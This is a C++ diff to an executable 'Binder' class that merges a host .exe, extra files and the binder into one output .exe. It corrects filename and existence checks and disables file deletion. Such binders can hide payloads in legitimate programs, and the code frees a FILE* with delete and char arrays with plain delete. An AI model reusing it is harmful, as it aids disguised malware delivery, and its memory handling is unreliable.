@@ -10,59 +10,66 @@ Binder::Binder() {
 
 bool Binder::setHostFileName(char *fileName) {
 	FILE *tempFile = nullptr;
+	char *name = nullptr;
 
-	if (checkExeFileNameFormat(fileName) && checkIfFileExist(fileName) && (tempFile = fopen(fileName, "rb"))) {
-		clearFile(hostFile);
-		hostFile[fileName] = tempFile;
+	if (checkExeFileNameFormat(fileName) && !checkIfFileExist(fileName) && (tempFile = fopen(fileName, "rb"))) {
+		name = new char[strlen(fileName) + 1];
+		strcpy(name, fileName);
+		hostFile[name] = tempFile;
 
 		return true;
 	}
 	else {
 		delete tempFile;
-
+		delete name;
 		return false;
 	}
 }
 
 bool Binder::addFile(char* fileName) {
-	FILE *tempFile;
+	FILE *tempFile = nullptr;
+	char *name = nullptr;
 
-	if (isSetHostFile() && isSetDestinationFile() && checkIfFileExist(fileName) &&
+	if (isSetHostFile() && isSetDestinationFile() && !checkIfFileExist(fileName) &&
 		(tempFile = fopen(fileName, "rb"))) {
-		fileList[fileName] = tempFile;
+		name = new char[strlen(fileName) + 1];
+		strcpy(name, fileName);
+		fileList[name] = tempFile;
 
 		return true;
 	}
 	else {
+		delete tempFile;
+		delete name;
 		return false;
 	}
 }
 
 bool Binder::setDestinationFileName(char* fileName) {
 	FILE *tempFile = nullptr;
+	char *name = nullptr;
 
-	if (checkExeFileNameFormat(fileName) && checkIfFileExist(fileName) && (tempFile = fopen(fileName, "ab+"))) {
-		clearFile(destinationFile);
-		destinationFile[fileName] = tempFile;
+	if (checkExeFileNameFormat(fileName) && !checkIfFileExist(fileName) && (tempFile = fopen(fileName, "wb+"))) {
+		name = new char[strlen(fileName) + 1];
+		strcpy(name, fileName);
+		destinationFile[name] = tempFile;
 
 		return true;
 	}
 	else {
 		delete tempFile;
-
+		delete name;
 		return false;
 	}
 }
 
-char **Binder::bind(char *argv0) {
+bool Binder::bind(char *argv0) {
 	char *hostFileData = nullptr;
 	char *fileListData = nullptr;
 	char *binderData = nullptr;
 	// List of all binded files, the count of all binded file
 	// is the file count in fileList and one host file and
 	// this program.
-	char **fileNameListInOrder = new char*[fileList.size() + 2];
-	int fileNameListInOrderCounter = 0;
 	FILE *dstFile = destinationFile.begin()->second;
 
 	if (isSetHostFile() && isSetDestinationFile()) {
@@ -76,24 +83,19 @@ char **Binder::bind(char *argv0) {
 		host file.
 		*/
 		writeFile(binderData, dstFile, true);
-		fileNameListInOrder[0] = argv0;
-		fileNameListInOrderCounter += 1;
 
 		// Writing host file into new host file.
 		writeFile(hostFileData, dstFile, false);
-		fileNameListInOrder[1] = hostFile.begin()->first;
-		fileNameListInOrderCounter += 1;
 
 		// Writing all files to be binded to the new host file.
 		for (std::map<char*, FILE*>::iterator it = fileList.begin(); it != fileList.end(); ++it) {
 			writeFile(readFileInBinary(it->second), dstFile, false);
-			fileNameListInOrderCounter += 1;
 		}
 
-		return fileNameListInOrder;
+		return true;
 	}
 	else {
-		return nullptr;
+		return false;
 	}
 }
 
@@ -109,10 +111,10 @@ bool Binder::checkExeFileNameFormat(char *fileName) {
 	int length = std::strlen(fileName);
 
 	if (length > 4 &&
-		fileName[length - 3] == '.' &&
-		fileName[length - 2] == 'e' &&
-		fileName[length - 1] == 'x' &&
-		fileName[length] == 'e') {
+		fileName[length - 4] == '.' &&
+		fileName[length - 3] == 'e' &&
+		fileName[length - 2] == 'x' &&
+		fileName[length - 1] == 'e') {
 		return true;
 	}
 	else {
@@ -124,10 +126,10 @@ bool Binder::checkIfFileExist(char *fileName) {
 	if (hostFile.find(fileName) == hostFile.end() &&
 		destinationFile.find(fileName) == destinationFile.end() &&
 		fileList.find(fileName) == fileList.end()) {
-		return true;
+		return false;
 	}
 	else {
-		return false;
+		return true;
 	}
 }
 
@@ -159,7 +161,12 @@ void Binder::clearFile(std::map<char*, FILE*> &m) {
 	if (!m.empty()) {
 		for (std::map<char*, FILE*>::iterator it = m.begin(); it != m.end(); ++it) {
 			fclose(it->second);
-			remove(it->first);
+			delete it->first;
+			/*
+			if (deleteFile) {
+				remove(it->first);
+			}
+			*/
 		}
 		m.clear();
 	}
